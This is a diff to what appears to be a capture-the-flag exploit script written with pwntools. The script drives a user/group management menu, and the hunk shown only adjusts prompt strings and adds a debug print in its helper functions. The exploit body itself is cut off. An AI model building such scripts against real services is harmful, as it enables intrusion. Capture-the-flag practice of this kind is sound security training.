@@ -18,28 +18,29 @@ from pwn import *
 import sys  
 
 def addUser(name, group, age):
-    r.sendlineafter("Action:", "0")
+    print(r.recv())
+    r.sendline("0")
     r.sendlineafter("name:", name)
     r.sendlineafter("group:", group)
     r.sendlineafter("age:", str(age))
 
 def displayGroup(groupName):
-    r.sendlineafter("Action:", "1")
+    r.sendlineafter("Action: ", "1")
     r.sendlineafter("name:", groupName)
 
 def displayUser(idx):
-    r.sendlineafter("Action:", "2")
+    r.sendlineafter("Action: ", "2")
     r.sendlineafter("index:", str(idx))
     return r.recvuntil("0:")
 
 def editGroup(idx, propogate, groupName):
-    r.sendlineafter("Action:", "3")
+    r.sendlineafter("Action: ", "3")
     r.sendlineafter("index:", str(idx))
     r.sendlineafter("(y/n):", propogate)
     r.sendlineafter("name:", groupName)
 
 def deleteUser(idx):
-    r.sendlineafter("Action:", "4")
+    r.sendlineafter("Action: ", "4")
     r.sendlineafter("index:", str(idx))
 
 def exploit(r):
